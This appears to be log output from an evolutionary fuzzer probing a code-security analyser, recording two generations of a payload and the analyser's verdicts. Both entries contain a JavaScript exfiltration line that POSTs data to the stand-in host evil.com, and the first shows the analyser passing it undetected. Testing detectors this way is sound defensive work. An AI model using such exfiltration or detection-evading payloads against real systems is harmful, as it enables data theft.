
## Degradation Discovered (Gen 4)
**Payload:** `const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);`
**Fitness:** 89.8
**Result:** Impact 0, Verdict PASS, Conf 0.01
**Graph:** []

## Degradation Discovered (Gen 7)
**Payload:** `const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);`
**Fitness:** 59.1
**Result:** Impact 44, Verdict REVIEW, Conf 0.03
**Graph:** ["IMPLICIT → NETWORK"]
